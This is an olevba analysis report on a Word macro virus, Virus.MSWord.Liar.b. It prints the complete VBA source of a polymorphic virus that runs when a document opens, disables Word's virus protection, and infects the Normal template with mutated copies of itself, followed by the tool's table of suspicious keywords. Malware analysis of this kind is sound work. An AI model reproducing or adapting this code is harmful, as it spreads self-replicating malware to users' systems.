olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.b-ff499cb1e7666f23608056843d612d99f0855524
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.b-ff499cb1e7666f23608056843d612d99f0855524 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open() '
Dim v(150): v(1) = "bliem by j2f": Options.VirusProtection = False '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
Set nh = s.VBProject.VBComponents(1).CodeModule '
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '
vc = "Sub document_close()" & t & vx & vbCr '
If MacroContainer = NormalTemplate Then '
Set s = ActiveDocument '
Set nh = s.VBProject.VBComponents(1).CodeModule '
vc = "Sub document_open()" & t & vx & vbCr '
End If: Randomize: lin = abc.countoflines '
For i = 2 To lin '
jc = "" '
d = Int(Rnd * 3) '
p = InStr(abc.Lines(i, 1), t) '
If p = 0 Then GoTo e_ '
If p = 2 And lin > 100 Then '
v(i) = "": d = 1: GoTo n_ '
End If '
v(i) = Left(abc.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20))  '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
e_: '
If nh.countoflines < 2 Then '
nh.AddFromString vc '
s.Save '
End If '
End Sub '
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] '
Rem Uses "bliem" polymorhic engine by Jack Twoflower '
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

